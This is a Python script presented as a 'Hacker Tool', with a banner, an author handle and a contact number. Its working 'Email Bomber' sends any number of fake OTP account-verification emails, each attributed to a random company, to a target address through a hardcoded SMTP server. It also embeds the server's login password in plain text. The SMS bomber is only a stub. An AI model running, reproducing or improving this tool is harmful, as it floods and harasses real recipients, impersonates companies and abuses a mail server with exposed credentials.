import smtplib
import random
import time
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import os
import random
import string

# Function to print hacker-style banner
def print_hacker_banner():
    os.system('cls' if os.name == 'nt' else 'clear')  # Only clear at the start
    print("\033[1;31;40m")  # Red color for the banner
    print("""
  ____                  _               
 |  _ \                | |              
 | |_) | ___  _ __ ___ | |__   ___ _ __ 
 |  _ < / _ \| '_ ` _ \| '_ \ / _ \ '__|
 | |_) | (_) | | | | | | |_) |  __/ |   
 |____/ \___/|_| |_| |_|_.__/ \___|_|   
                                        
    """)
    print("\033[0m")  # Reset the color after the banner

# Box with multi colors (Green and Blue)
    print("\033[1;32;40m" + "═" * 80)  # Top border (Green)
    print("\033[1;33;40m" + "║" + "\033[1;37;40m Author Name : Pak Anonymous" + "\033[1;33;40m ║")  # Author line (Yellow text)
    print("\033[1;33;40m" + "║" + "\033[1;37;40m Whatsapp Number : +923000448415" + "\033[1;33;40m ║")  # Number line (Yellow text)
    print("\033[1;32;40m" + "═" * 80)  # Bottom border (Green)
    
    print("\033[0m")  # Reset the color



    print("\033[1;33;40m")
    print("Welcome to the Hacker Tool")
    print("Choose an option:")
    print("1. Email Bomber")
    print("2. SMS Bomber (Dummy)")
    print("3. Exit")
    print("\033[0m")
    time.sleep(1)

# SMTP server details
SMTP_SERVER = 'mail.royalearninghub.click'
SMTP_PORT = 587
SENDER_EMAIL = 'noreply@royalearninghub.click'  # Apna email daalein
SENDER_PASSWORD = '+bUtR?g=)p+2'  # Apna password ya app-specific password

# Function to generate random OTP
def generate_otp():
    otp = ''.join(random.choices(string.digits, k=6))  # Random 6-digit OTP
    return otp

# Function to send email
def send_email(receiver_email, num_emails):
    # List of random companies
    companies = ["TechCorp", "FinSolve", "InnoSys", "XenoTech", "GlobalX", "SoftWare Solutions", "Alpha Inc."]
    
    # Start sending emails
    for _ in range(num_emails):
        # Select random company and generate OTP
        company = random.choice(companies)
        otp = generate_otp()
        
        # Generate random email content
        subject = f"Account Verification - {company}"
        body = f"Hello,\n\nPlease verify your account using the following OTP for {company}:\n\nOTP: {otp}\n\nThank you for using our service!"
        
        # Create the email message
        message = MIMEMultipart()
        message['From'] = SENDER_EMAIL
        message['To'] = receiver_email
        message['Subject'] = subject
        
        message.attach(MIMEText(body, 'plain'))
        
        # Connect to the SMTP server
        try:
            server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
            server.starttls()  # Secure connection
            server.login(SENDER_EMAIL, SENDER_PASSWORD)
            server.sendmail(SENDER_EMAIL, receiver_email, message.as_string())
            server.quit()
            print(f"Email sent successfully to {receiver_email}")
        except Exception as e:
            print(f"Error: {e}")

# Dummy function for SMS Bomber (for future integration)
def send_sms():
    print("SMS Bomber is a dummy function in this script.")
    print("In a real scenario, you would integrate an SMS API here.")

# Main function for program flow
def main():
    while True:
        print_hacker_banner()
        
        choice = input("Enter your choice (1/2/3): ")
        
        if choice == '1':
            print("Email Bomber Selected...")
            receiver_email = input("Please enter the recipient's email address: ")
            num_emails = int(input("How many emails do you want to send? (5, 10, 20, etc.): "))
            
            print("\033[1;31;40m")  # Red color for the bombing effect
            print("Starting the bombing...".center(80))
            time.sleep(2)  # Simulate a delay for sending the email
            
            send_email(receiver_email, num_emails)

        elif choice == '2':
            print("SMS Bomber Selected...")
            send_sms()

        elif choice == '3':
            print("\033[1;34;40m")  # Blue color for exit
            print("Exiting...".center(80))
            time.sleep(2)
            break  # Exit the loop and end the program

        else:
            print("Invalid choice, please select 1, 2, or 3.")
            time.sleep(1)

if __name__ == "__main__":
    main()
